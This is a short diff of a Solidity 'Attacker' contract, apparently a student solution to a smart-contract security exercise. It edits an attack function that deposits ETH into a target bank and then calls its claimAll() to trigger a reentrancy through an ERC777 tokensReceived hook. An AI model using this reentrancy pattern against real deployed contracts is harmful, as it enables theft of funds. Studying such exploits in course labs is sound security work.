@@ -37,13 +37,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
-		// Step 1: Deposit ETH to get a balance in the bank
+		// Deposit ETH to get a balance in the bank
+		depth = 0;
         bank.deposit{value: amt}();
         emit Deposit(amt);
-
-        // Step 2: Call the vulnerable claimAll() to start the reentrancy
-        // This will trigger tokensReceived() which will re-enter claimAll()
-        depth = 0;
         bank.claimAll();
 	}
 
